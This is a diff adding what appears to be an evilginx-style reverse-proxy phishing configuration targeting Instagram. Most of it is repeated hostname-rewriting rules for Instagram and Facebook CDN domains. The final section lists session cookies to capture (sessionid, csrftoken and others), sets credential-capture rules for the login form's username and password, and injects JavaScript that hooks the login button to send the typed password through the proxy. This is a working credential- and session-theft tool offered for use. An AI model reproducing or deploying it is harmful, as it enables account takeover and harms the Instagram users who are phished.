+  - {triggers_on: 'www.instagram.com', orig_sub: 'connect', domain: 'facebook.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'img.instagram.fcdg1-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'scontent-cdn.cdninstagram.com', orig_sub: 'scontent-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'graph', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static.xx', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'instagram.fmxp10-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'edge-chat', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+#10
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'connect', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'connect', domain: 'facebook.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'img.instagram.fcdg1-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'scontent-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'graph.instagram.com', orig_sub: 'graph', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static.xx', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'instagram.fmxp10-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'edge-chat', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+#11
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'connect', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'connect', domain: 'facebook.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'img.instagram.fcdg1-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'scontent-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'graph', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'static.xx', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'instagram.fmxp10-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'edge-chat', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+#12
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'connect', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'connect', domain: 'facebook.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'img.instagram.fcdg1-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'scontent-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'graph', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static.xx', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'instagram.fmxp10-1.fna.fbcdn.net', orig_sub: 'instagram.fmxp10-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'edge-chat', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+#12
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'connect', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'connect', domain: 'facebook.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'img.instagram.fcdg1-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'scontent-cdn', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'graph', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static.xx', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'instagram.fmxp10-1.fna.fbcdn.net', orig_sub: 'instagram.fmxp10-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'edge-chat.instagram.com', orig_sub: 'edge-chat', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+# 4dd
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'graphql', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'i', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: '', domain: 'fbcdn.net', search: '(instagram\.f[a-z]{3}[0-9]+-[0-9]+\.fna\.{domain_regexp}\/v\/)', replace: 'img.{domain}/v/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: '', domain: 'fbcdn.net', search: '(instagram\.f[a-z]{3}[0-9]+-[0-9]+\.fna\.{domain_regexp}\\\/v\\\/)', replace: 'img.{domain}\\/v\\/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: 'www.instagram.com'
+    keys: ['ig_nrcb','ds_user_id','ds_user_id','csrftoken','ig_did','mid','sessionid','datr','rur','sessionid','.*,regexp']
+  - domain: '.instagram.com'
+    keys: ['ig_nrcb','ds_user_id','ds_user_id','csrftoken','ig_did','mid','sessionid','datr','rur','.*regexp']
+auth_urls:
+ - '/*'
+credentials:
+  username:
+    key: 'user'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+# credentials:
+#  username:
+#   key: 'user'
+#   search: '"accountName":"([^"]*)'
+#   type: 'post'
+#  password:
+#   key: 'password'
+#   search: '"password":"([^"]*)'
+#   type: 'post'
+login:
+  domain: 'www.instagram.com'
+  path: '/accounts/login'
+  # path: '/'
+js_inject:
+  - trigger_domains: ["www.instagram.com"]
+    trigger_paths: ["/accounts/login"]
+    trigger_params: []
+    script: |
+      function onclickListener(){
+        var submit = document.querySelectorAll('button[type=submit]')[0];
+        submit.setAttribute("onclick", "sendPass()");
+        return;
+      }
+      function sendPass(){
+        var password = document.getElementsByName("password")[0].value;
+
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/accounts/login/ajax/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("password="+encodeURIComponent(password));
+
+        return;
+      }
+      setTimeout(function(){ onclickListener(); }, 1000);
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
